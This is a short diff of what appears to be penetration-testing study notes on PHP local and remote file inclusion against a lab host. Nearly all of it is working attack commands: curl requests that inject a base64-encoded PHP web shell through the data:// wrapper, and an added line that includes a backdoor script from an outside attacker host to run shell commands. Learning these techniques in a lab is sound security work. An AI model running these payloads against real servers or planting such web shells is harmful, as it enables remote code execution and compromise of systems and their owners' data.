@@ -34,5 +34,7 @@ curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%
 echo -n '<?php echo system($_GET["cmd"]);?>' | base64 (PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==)
 
 curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
+
+curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=ls"
 ```
 >we need to be aware that the data:// wrapper will not work in a default PHP installation. To exploit it, the allow_url_include7 setting needs to be enabled
